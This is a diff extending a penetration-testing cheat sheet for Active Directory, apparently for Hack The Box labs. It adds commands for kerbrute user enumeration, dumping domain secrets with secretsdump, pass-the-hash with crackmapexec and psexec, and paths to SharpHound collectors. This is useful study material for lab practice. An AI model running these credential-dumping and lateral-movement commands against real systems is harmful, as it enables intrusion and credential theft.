@@ -1,5 +1,42 @@
 # Cheat Sheet
 
+## Initial Attack Vectors
+
+### User Enumeration
+
+### Brute Force
+
+#### kerbrute
+
+```bash
+kerbrute userenum --dc <IP> -d <domain.local> users.txt
+# Can verify working by placing known users in user.txt i.e. administrator, guest,
+```
+
+## Post-Compromise Enumeration
+
+#### GetADUsers
+
+Queries target domain for users data
+
+```bash
+GetADUsers.py -all -dc-ip <IP> active.htb/svc_tgs   # Will need account creds
+```
+
+#### secretsdump
+
+Performs various techniques to dump secrets from the remote machine without executing any agent there.
+
+```
+secretsdump.py htb.local/<username>@<IP>
+secretsdump.py htb.local/<username>:<password>@<IP>
+# Grab the hashes then attempt to crack or pass the hash
+# Pass the hash
+crackmapexec smb <IP> -u administrator -H <hash>
+# If Pwn3d!...
+psexec.py -hashes <hash> administrator@<IP>
+```
+
 ## Bloodhound
 
 ### Collection
@@ -7,6 +44,8 @@
 #### SharpHound
 
 ```bash
+/usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
+/usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1
 ```
 
 #### BloodHound.py
@@ -22,8 +61,6 @@ bloodhound-python -u <username> -p <password> -ns <IP> -d <domain.local> -c All
 ```
 
 ### Enumeration
-
-
 
 #### Node Info
 
